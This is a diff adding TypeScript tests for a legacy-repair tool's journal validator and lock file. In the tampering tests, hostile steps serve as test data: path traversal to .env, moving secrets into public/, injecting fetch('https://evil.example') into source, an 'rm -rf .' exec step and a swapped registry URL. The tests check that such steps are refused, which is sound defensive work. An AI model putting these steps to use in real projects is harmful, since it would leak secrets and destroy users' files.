@@ -9,11 +9,17 @@ import {
   isLegacyConfig,
   planLegacyRepair,
   readJournal,
+  LOCK_FILE,
   REPAIR_FILE,
+  RepairJournalError,
+  RepairLockedError,
   RepairRolledBackError,
   resumeLegacyRepair,
   rewriteSpecifiers,
+  validateJournal,
+  withRepairLock,
   type ComponentsConfig,
+  type RepairJournal,
 } from "./legacy"
 import { UnsafePathError } from "./paths"
 
@@ -264,7 +270,8 @@ describe("a repair that stops part way", () => {
 
         const left = await readJournal(dir)
         expect(left?.done).toBe(recorded ? stop + 1 : stop)
-        await resumeLegacyRepair(dir, left!)
+        // The validator accepts every real plan, wherever it stopped.
+        await resumeLegacyRepair(dir, left!, await validateJournal(dir, left!, ""))
         expect(await tree(dir), `stopped after step ${stop}, ${recorded ? "recorded" : "not recorded"}`).toEqual(expected)
       }
     }
@@ -304,5 +311,71 @@ describe("a repair that stops part way", () => {
     await fs.writeFile(path.join(dir, duplicate.from), "// someone's edit\n")
     await expect(applyLegacyRepair(dir, plan)).rejects.toThrow(RepairRolledBackError)
     expect(await read(dir, duplicate.from)).toBe("// someone's edit\n")
+  })
+})
+
+describe("a plan found on disk", () => {
+  // Each tamper is applied to a real plan for the broken project.
+  const tampers: [string, (steps: RepairJournal["steps"]) => void, string][] = [
+    ["moves .env into public/", (s) => s.unshift({ op: "move", from: ".env", to: "public/.env" }), "move .env to public/.env"],
+    ["moves a 0.3 component anywhere but its repaired path", (s) => s.unshift({ op: "move", from: "src/src/components/ui/button.tsx", to: "public/button.tsx" }), "move src/src/components/ui/button.tsx to public/button.tsx"],
+    ["moves a file that isn't a component out of a 0.3 folder", (s) => s.unshift({ op: "move", from: "src/src/components/ui/keys.json", to: "components/ui/keys.json" }), "move src/src/components/ui/keys.json"],
+    ["climbs out of a 0.3 folder", (s) => s.unshift({ op: "move", from: "src/src/components/ui/../../../.env", to: "components/ui/.env" }), "move src/src/components/ui/../../../.env"],
+    ["deletes a file the repair doesn't own", (s) => s.unshift({ op: "delete", file: "app/page.tsx", before: "" }), "delete app/page.tsx"],
+    ["writes other settings into components.json", (s) => {
+      const write = s.find((x) => x.op === "write" && x.file === "components.json") as { after: string }
+      write.after = write.after.replace("https://ui.smicolon.com/r/{name}.json", "https://evil.example/{name}.json")
+    }, "write a components.json other than the repaired one"],
+    ["writes code into a source file", (s) => s.push({ op: "write", file: "app/page.tsx", before: "x", after: "x;fetch('https://evil.example')" }), "write app/page.tsx"],
+    ["writes .env", (s) => s.push({ op: "write", file: ".env", before: null, after: "KEY=stolen" }), "write .env"],
+    ["creates a folder off the repair's paths", (s) => s.unshift({ op: "mkdir", dir: "public/leak" }), "create the folder public/leak"],
+    ["removes a folder off the repair's paths", (s) => s.push({ op: "rmdir", dir: "app" }), "remove the folder app"],
+    ["runs a step that doesn't exist", (s) => s.push({ op: "exec", command: "rm -rf ." } as never), "run a step it doesn't recognise"],
+  ]
+
+  it.each(tampers)("is refused when it %s, before anything changes", async (_name, tamper, message) => {
+    const dir = await brokenProject()
+    await fs.writeFile(path.join(dir, ".env"), "SECRET=1\n")
+    const journal = await beginLegacyRepair(dir, await planLegacyRepair(dir, config033(true), ""))
+    tamper(journal.steps)
+    const before = await tree(dir)
+    await expect(validateJournal(dir, journal, "")).rejects.toThrow(RepairJournalError)
+    await expect(validateJournal(dir, journal, "")).rejects.toThrow(message)
+    expect(await tree(dir)).toEqual(before)
+  })
+
+  it("is refused when its progress is out of range", async () => {
+    const dir = await brokenProject()
+    const journal = await beginLegacyRepair(dir, await planLegacyRepair(dir, config033(true), ""))
+    for (const done of [-1, 1.5, journal.steps.length + 1]) {
+      await expect(validateJournal(dir, { ...journal, done }, "")).rejects.toThrow(RepairJournalError)
+    }
+  })
+
+  it("is refused when components.json isn't from 0.3, rather than trusted", async () => {
+    const dir = await brokenProject()
+    const journal = await beginLegacyRepair(dir, await planLegacyRepair(dir, config033(true), ""))
+    await fs.writeFile(path.join(dir, "components.json"), JSON.stringify({ aliases: {}, registries: { "@fasla": "x/{name}" } }))
+    await expect(validateJournal(dir, journal, "")).rejects.toThrow("isn't one from 0.3")
+  })
+})
+
+describe("the repair lock", () => {
+  it("lets one run in at a time, and frees itself when that run ends, even with an error", async () => {
+    const dir = await project({})
+    let finish!: () => void
+    const first = withRepairLock(dir, () => new Promise<void>((resolve) => (finish = resolve)))
+    await new Promise((r) => setTimeout(r, 10))
+    await expect(withRepairLock(dir, async () => "second")).rejects.toThrow(RepairLockedError)
+    finish()
+    await first
+    await expect(withRepairLock(dir, async () => { throw new Error("boom") })).rejects.toThrow("boom")
+    expect(await withRepairLock(dir, async () => "third")).toBe("third")
+    expect(await fs.pathExists(path.join(dir, LOCK_FILE))).toBe(false)
+  })
+
+  it("treats a lock it can't read as held, and says how to clear it", async () => {
+    const dir = await project({ [LOCK_FILE]: "not json" })
+    await expect(withRepairLock(dir, async () => 1)).rejects.toThrow(`If no other run is going, delete ${LOCK_FILE}`)
   })
 })
